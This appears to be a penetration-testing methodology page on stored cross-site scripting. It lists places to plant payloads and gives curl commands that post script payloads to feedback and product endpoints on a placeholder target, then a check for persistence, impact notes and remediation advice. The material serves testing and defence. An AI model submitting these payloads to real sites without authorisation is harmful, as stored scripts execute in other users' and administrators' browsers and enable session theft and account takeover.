# Stored XSS

## Summary
Payload persisted on the server and executed for other users.

## Detection

### Step 1: Find Storage Vectors
```bash
# Test every write endpoint
- Profile fields (name, bio, avatar URL)
- Comments / reviews / feedback
- Product names / descriptions
- Support tickets
- File uploads (SVG, HTML)
- Chat messages
```

### Step 2: Submit Payload via API Directly
```bash
# Feedback/review submission
curl -X POST https://target.com/api/Feedbacks \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(document.cookie)</script>","rating":5}'

# Product creation (if admin)
curl -X POST https://target.com/api/Products \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"name":"<script>alert(1)</script>","description":"XSS","price":1.99}'
```

### Step 3: Verify Persistence
```bash
# Retrieve the stored data
curl -s https://target.com/api/Feedbacks | python3 -c "
import json,sys; d=json.load(sys.stdin)
for f in d.get('data',[]):
    print(f'  [{f[\"id\"]}] {f[\"comment\"][:60]}')
"
```

### Step 4: Check for Encoding
- Payload stored exactly as submitted? → Stored XSS
- Payload HTML-encoded? → Check for context bypass
- Payload truncated? → Check max length limits

## API vs Browser Context
Stored XSS via API is valid if:
1. The API stores the raw payload
2. Another user views it via a web interface
3. The web interface renders it without encoding

## Impact
- Persistent across sessions and users
- Can execute in admin context → account takeover
- Self-XSS still counts if stored and rendered

## Remediation
- Output encoding on rendering, not just on storage
- Content Security Policy
- Input sanitization on write
